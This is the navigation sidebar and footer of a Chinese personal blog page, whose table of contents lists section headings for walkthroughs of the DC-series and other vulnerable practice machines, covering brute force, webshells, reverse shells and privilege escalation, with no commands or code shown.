href="#%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="nav-number">6.2.</span> <span class="nav-text">密码爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hydra%E5%AF%B9%E4%B8%89%E7%94%A8%E6%88%B7%E8%BF%9B%E8%A1%8Cssh%E7%88%86%E7%A0%B4"><span class="nav-number">6.3.</span> <span class="nav-text">hydra对三用户进行ssh爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#teehee"><span class="nav-number">6.4.</span> <span class="nav-text">teehee</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7"><span class="nav-number">6.4.1.</span> <span class="nav-text">添加管理员账户</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%94%E3%80%81DC-5-%E9%AB%98%E7%BA%A7"><span class="nav-number">7.</span> <span class="nav-text">五、DC-5[高级]</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-4"><span class="nav-number">7.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">7.2.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E9%AA%8C%E8%AF%81%E6%88%91%E4%BB%AC%E7%9A%84%E6%83%B3%E6%B3%95"><span class="nav-number">7.2.1.</span> <span class="nav-text">1.验证我们的想法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell"><span class="nav-number">7.2.2.</span> <span class="nav-text">2.利用文件包含拿shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%EF%BC%89%E5%90%91Nginx%E9%94%99%E8%AF%AF%E6%97%A5%E5%BF%97%E5%AF%BC%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%F0%9F%90%8E"><span class="nav-number">7.2.2.1.</span> <span class="nav-text">1）向Nginx错误日志导入一句话🐎</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%EF%BC%89nc%E5%91%BD%E4%BB%A4%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">7.2.2.2.</span> <span class="nav-text">2）nc命令反弹shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%BE%97%E7%A8%B3%E5%AE%9A%E7%9A%84shell"><span class="nav-number">7.2.2.3.</span> <span class="nav-text">*获得稳定的shell</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%8F%90%E6%9D%83"><span class="nav-number">7.2.3.</span> <span class="nav-text">3.提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%EF%BC%89searchsploit%E6%89%BE%E6%8F%90%E6%9D%83%E8%84%9A%E6%9C%AC%E6%96%87%E4%BB%B6"><span class="nav-number">7.2.3.1.</span> <span class="nav-text">1）searchsploit找提权脚本文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%EF%BC%89nc%E5%90%91%E9%9D%B6%E6%9C%BA%E4%BC%A0%E5%85%A5%E8%84%9A%E6%9C%AC%E6%8F%90%E6%9D%83%E6%96%87%E4%BB%B6"><span class="nav-number">7.2.3.2.</span> <span class="nav-text">2）nc向靶机传入脚本提权文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%EF%BC%89%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="nav-number">7.2.3.3.</span> <span class="nav-text">3）执行脚本进行提权</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%87%BA%E7%8E%B0%E6%84%8F%E5%A4%96"><span class="nav-number">7.2.3.3.1.</span> <span class="nav-text">*出现意外</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%BB%99cc1%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="nav-number">7.2.3.3.1.1.</span> <span class="nav-text">给cc1配置环境变量</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E6%9D%A5%E4%BA%86%E3%80%90%E6%9C%9F%E5%BE%85%E3%80%91"><span class="nav-number">7.2.3.3.1.2.</span> <span class="nav-text">关键来了【期待】</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%AD%E3%80%81DC-6-%E4%B8%AD%E7%BA%A7"><span class="nav-number">8.</span> <span class="nav-text">六、DC-6[中级]</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-5"><span class="nav-number">8.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-wpscan%E7%88%86%E7%A0%B4%E5%87%BA%E7%94%A8%E6%88%B7%E5%90%8D%E3%80%90dc2%E9%87%8C%E6%90%9E%E8%BF%87%E3%80%91"><span class="nav-number">8.2.</span> <span class="nav-text">1.wpscan爆破出用户名【dc2里搞过】</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-wpscan%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81"><span class="nav-number">8.3.</span> <span class="nav-text">2.wpscan爆破密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E7%99%BB%E5%BD%95%E7%BD%91%E7%AB%99%E6%89%BE%E4%BF%A1%E6%81%AF"><span class="nav-number">8.4.</span> <span class="nav-text">3.登录网站找信息</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%EF%BC%8950110-py%E3%80%90%E6%9C%89%E9%97%AE%E9%A2%98%EF%BC%8C%E4%B8%8D%E5%BB%BA%E8%AE%AE%E7%94%A8%E3%80%91"><span class="nav-number">8.4.1.</span> <span class="nav-text">1）50110.py【有问题，不建议用】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%EF%BC%8945274-html"><span class="nav-number">8.4.2.</span> <span class="nav-text">2）45274.html</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#nc%E7%9B%91%E5%90%AC%E6%8B%BFshell"><span class="nav-number">8.4.2.1.</span> <span class="nav-text">nc监听拿shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A5%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E8%BA%AB%E4%BB%BD%E8%BF%90%E8%A1%8C%E8%84%9A%E6%9C%AC%EF%BC%8C%E5%AE%9E%E7%8E%B0%E5%88%87%E6%8D%A2%E7%94%A8%E6%88%B7"><span class="nav-number">8.4.2.2.</span> <span class="nav-text">以其他用户身份运行脚本，实现切换用户</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-nmap%E6%8F%90%E6%9D%83"><span class="nav-number">8.5.</span> <span class="nav-text">4.nmap提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%97%A7%E7%89%88"><span class="nav-number">8.5.1.</span> <span class="nav-text">1.旧版</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%96%B0%E7%89%88"><span class="nav-number">8.5.2.</span> <span class="nav-text">2.新版</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%83%E3%80%81DC-7-%E4%B8%AD%E7%BA%A7"><span class="nav-number">9.</span> <span class="nav-text">七、DC-7[中级]</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-6"><span class="nav-number">9.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E8%B7%B3%E5%87%BA%E6%A1%86%E6%9E%B6"><span class="nav-number">9.2.</span> <span class="nav-text">1.跳出框架</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-ssh%E7%99%BB%E5%BD%95"><span class="nav-number">9.3.</span> <span class="nav-text">2.ssh登录</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E3%80%90cron%EF%BC%88crond%EF%BC%89%E3%80%91"><span class="nav-number">9.3.1.</span> <span class="nav-text">*定时任务【cron（crond）】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E6%80%9D%E8%B7%AF"><span class="nav-number">9.3.2.</span> <span class="nav-text">*关键思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">9.3.3.</span> <span class="nav-text"></span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-drush%E5%91%BD%E4%BB%A4%E5%AF%B9drupal%E4%BF%AE%E6%94%B9%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81"><span class="nav-number">9.4.</span> <span class="nav-text">3.drush命令对drupal修改用户名和密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E7%99%BB%E5%BD%95%E7%BD%91%E7%AB%99"><span class="nav-number">9.5.</span> <span class="nav-text">4.登录网站</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0php%E6%89%A7%E8%A1%8C%E6%8F%92%E4%BB%B6"><span class="nav-number">9.5.1.</span> <span class="nav-text">添加php执行插件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A0%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="nav-number">9.5.2.</span> <span class="nav-text">加入一句话木马</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5getshell"><span class="nav-number">9.6.</span> <span class="nav-text">5.蚁剑连接getshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-%E5%8F%8D%E5%BC%B9shell%E6%8B%BFwww-data"><span class="nav-number">9.7.</span> <span class="nav-text">6.反弹shell拿www-data</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-%E5%88%A9%E7%94%A8%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E3%80%90cron%E3%80%91%E6%8F%90%E6%9D%83root"><span class="nav-number">9.8.</span> <span class="nav-text">7.利用定时任务【cron】提权root</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%AB%E3%80%81DC8-%E5%88%9D%E7%BA%A7"><span class="nav-number">10.</span> <span class="nav-text">八、DC8[初级]</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-7"><span class="nav-number">10.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-sql%E6%B3%A8%E5%85%A5"><span class="nav-number">10.2.</span> <span class="nav-text">1.sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E5%90%8E%E5%8F%B0%E6%B7%BB%E5%8A%A0%E6%9C%A8%E9%A9%AC"><span class="nav-number">10.3.</span> <span class="nav-text">2.后台添加木马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">10.4.</span> <span class="nav-text">3.反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E6%8F%90%E6%9D%83%E3%80%90exim4%E3%80%91"><span class="nav-number">10.5.</span> <span class="nav-text">4.提权【exim4】</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%84%8F%E5%A4%96"><span class="nav-number">10.5.1.</span> <span class="nav-text">意外</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#p-s-setuid"><span class="nav-number">10.5.2.</span> <span class="nav-text">p.s. setuid</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%A8pwn%E4%B8%AD"><span class="nav-number">10.5.2.1.</span> <span class="nav-text">在pwn中</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B9%9D%E3%80%81DC9-%E4%B8%AD%E7%BA%A7"><span class="nav-number">11.</span> <span class="nav-text">九、DC9[中级]</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-8"><span class="nav-number">11.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-sql%E6%B3%A8%E5%85%A5-1"><span class="nav-number">11.2.</span> <span class="nav-text">1.sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">11.3.</span> <span class="nav-text">2.文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-ssh"><span class="nav-number">11.4.</span> <span class="nav-text">3.ssh</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%EF%BC%89-knockd"><span class="nav-number">11.4.1.</span> <span class="nav-text">1） knockd</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%EF%BC%89-hydra"><span class="nav-number">11.4.2.</span> <span class="nav-text">2） hydra</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E6%8F%90%E6%9D%83"><span class="nav-number">11.5.</span> <span class="nav-text">4.提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#py%E8%84%9A%E6%9C%AC%E5%88%A9%E7%94%A8"><span class="nav-number">11.5.1.</span> <span class="nav-text">py脚本利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#openssl%E5%8A%A0%E7%9B%90"><span class="nav-number">11.5.1.1.</span> <span class="nav-text">openssl加盐</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ELSE"><span class="nav-number">12.</span> <span class="nav-text">ELSE</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81DEATHNOTE-1-%E5%88%9D%E7%BA%A7"><span class="nav-number">13.</span> <span class="nav-text">一、DEATHNOTE: 1[初级]</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-9"><span class="nav-number">13.1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E4%BF%A1%E6%81%AF"><span class="nav-number">13.1.1.</span> <span class="nav-text">*关键信息</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-wpscan"><span class="nav-number">13.2.</span> <span class="nav-text">1.wpscan</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0"><span class="nav-number">13.2.1.</span> <span class="nav-text">登录后台</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-ssh%E7%99%BB%E5%BD%95-1"><span class="nav-number">13.3.</span> <span class="nav-text">2.ssh登录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E7%99%BB%E5%BD%95kira"><span class="nav-number">13.4.</span> <span class="nav-text">3.登录kira</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E6%8F%90%E6%9D%83-1"><span class="nav-number">13.5.</span> <span class="nav-text">4.提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#p-s-%E9%9D%B6%E6%9C%BA%E5%BD%A9%E8%9B%8B"><span class="nav-number">13.6.</span> <span class="nav-text">p.s.靶机彩蛋</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81MATRIX-BREAKOUT%EF%BC%9A2-MORPHEUS-%E4%B8%AD%E7%BA%A7"><span class="nav-number">14.</span> <span class="nav-text">二、MATRIX-BREAKOUT：2 MORPHEUS[中级]</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-10"><span class="nav-number">14.1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dirbuster"><span class="nav-number">14.1.1.</span> <span class="nav-text">dirbuster</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%F0%9F%90%8E"><span class="nav-number">14.1.2.</span> <span class="nav-text">一句话🐎</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FLAG1"><span class="nav-number">14.2.</span> <span class="nav-text">FLAG1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FLAG2"><span class="nav-number">14.3.</span> <span class="nav-text">FLAG2</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Ttoc"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">Ttoc</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">51</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/try-to-change" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;try-to-change" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:wejoke3@gmail.com" title="E-Mail → mailto:wejoke3@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2022 – 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ttoc</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

<script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>